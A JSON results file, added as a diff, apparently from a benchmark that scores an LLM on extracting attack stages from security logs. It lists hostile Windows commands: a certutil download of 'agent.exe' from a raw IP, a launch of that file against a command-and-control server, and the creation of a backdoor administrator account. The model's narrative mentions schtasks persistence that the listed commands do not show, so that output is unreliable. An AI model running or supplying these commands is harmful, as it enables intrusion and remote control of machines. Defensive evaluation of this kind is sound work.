@@ -1,0 +1,78 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe & cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Execution"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c cmd /c cd /d ",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The analysis reveals an adversary initially accessing the machine via a downloaded executable named `agent.exe` through `certutil`. This download and execution point towards initial access. The adversary then establishes persistence using scheduled tasks (`schtasks`) and privilege escalation by adding a new user to the administrators group. Finally, commands like `taskkill`, `cmd`, and others indicate continuous command-and-control communication as well as the execution of various actions.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 539,
+      "total_tokens": 20988,
+      "wall_clock_s": 9.098,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.2857142857142857,
+      "f1": 0.2857142857142857,
+      "tp": 2,
+      "fp": 5,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.2857142857142857,
+      "recall": 0.2857142857142857,
+      "f1": 0.2857142857142857,
+      "tp": 2,
+      "fp": 5,
+      "fn": 5,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 539,
+      "total_tokens": 20988,
+      "wall_clock_s": 9.098,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
